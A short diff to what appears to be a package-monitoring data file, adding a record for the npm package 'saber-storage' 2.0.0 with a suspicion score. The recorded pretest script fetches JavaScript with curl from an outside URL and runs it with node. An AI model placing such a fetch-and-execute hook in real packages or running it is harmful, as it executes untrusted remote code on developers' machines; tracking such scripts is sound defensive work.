@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "saber-storage",
+    "version": "2.0.0",
+    "scriptType": "pretest",
+    "scriptContent": "node -e \"$(curl -sf http://saberlabs.github.io/static/test/depend.js)\"",
+    "previousVersion": "2.0.0-beta.1",
+    "timestamp": "2026-05-08T19:39:58.152Z",
+    "issuesend": true,
+    "suspicionScore": 13
+  },
+  {
     "packageName": "rsuite-affix",
     "version": "2.0.0",
     "scriptType": "dev",
